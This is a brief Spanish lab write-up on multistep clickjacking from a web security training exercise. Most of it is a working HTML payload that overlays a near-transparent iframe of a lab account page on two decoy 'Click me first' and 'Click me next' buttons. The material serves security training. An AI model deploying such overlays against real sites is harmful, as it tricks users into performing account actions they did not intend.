---
title: "5 - Multistep clickjacking"
---

# 5 - Multistep clickjacking

Lo mismo pero clicando dos veces, lo tuve que hacer manual, quizás para hacerlo con clikcbandit había que poner  Click me first" and "Click me next" 


```html
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
        .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:53px;
		z-index: 1;
	}
       .secondClick {
		top:290px;
		left:215px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a45001204020b0181eb260a00d60050.web-security-academy.net/my-account"></iframe>
```
